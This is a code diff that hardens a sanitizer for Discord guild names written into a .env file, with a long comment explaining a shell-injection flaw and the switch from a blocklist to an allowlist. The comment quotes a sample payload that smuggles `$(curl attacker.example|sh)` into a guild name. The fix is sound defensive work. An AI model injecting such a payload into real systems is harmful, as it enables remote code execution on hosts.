@@ -112,9 +112,41 @@ export function readDiscordBotSettingsState(config) {
 // literal newline was never traced. Reject control characters, "=", and
 // newlines/CR explicitly, as defense-in-depth independent of the loader's
 // actual behavior, rather than trusting quoteEnv() alone.
+//
+// dune-awakening-selfhost-docker#870 (CRITICAL, found by automated review
+// on #801 after that PR had already merged): the control-chars-and-"="
+// blocklist above left `$` and backtick completely untouched. quoteEnv()'s
+// JSON.stringify() only escapes '"', '\\', and control characters, so a
+// guild name like `Evil$(curl attacker.example|sh)Server` was written
+// verbatim into a double-quoted .env line. runtime/scripts/start-all.sh
+// (and sibling scripts) `. ./.env` that file inside `set -a; ...; set +a`
+// -- a real bash *source*, not a passive read -- so that payload executed
+// as a real shell command with the script's own privileges. The attacker
+// here is not the console operator: it's any Discord user with Manage
+// Server permission in a guild the operator merely owns/administers, so
+// this was a genuine Discord-side-actor-to-host-RCE privilege boundary
+// crossing, not a self-harm scenario. Switched from a blocklist to an
+// ALLOWLIST -- this value is display-only (never used for authorization,
+// see this function's own callers), so keeping only Unicode letters,
+// digits, a literal space, and a small, genuinely-safe punctuation set is
+// categorically safer than trying to enumerate every shell metacharacter
+// (`$`, backtick, parens, brackets, braces, quotes, `;`, `|`, `&`, `<`,
+// `>`, `\`, `=`, `~`, `*` are all excluded by construction, not by name).
+//
+// Layer 2 audit finding (real, found by /code-review high on this exact
+// PR before merge): the first version of this allowlist used `\s` for
+// whitespace, which in JS regex also matches \n, \r, \t, \v, \f, and the
+// Unicode line/paragraph separators U+2028/U+2029 -- not just a literal
+// space. That silently reopened a version of the very risk this file's
+// own #860 comment above already flags as "never traced": bash sourcing
+// doesn't unescape quoteEnv()'s JSON-escaped "\n" back to a real newline,
+// but Docker Compose's own separate .env-file parser (used for ${VAR}
+// interpolation in docker-compose.web.yml) is documented to do exactly
+// that. Using a literal space here instead of \s closes that gap by
+// construction, matching the original blocklist's own explicit rejection
+// of every control character, not just the shell-metacharacter set.
 function sanitizeEnvDisplayValue(value) {
-  // eslint-disable-next-line no-control-regex
-  return value.replace(/[\x00-\x1f\x7f=]/g, "");
+  return value.replace(/[^\p{L}\p{N} .,'!?_-]/gu, "");
 }
 
 export function persistHostedBotConnectedGuild(config, { guildId, guildName } = {}) {
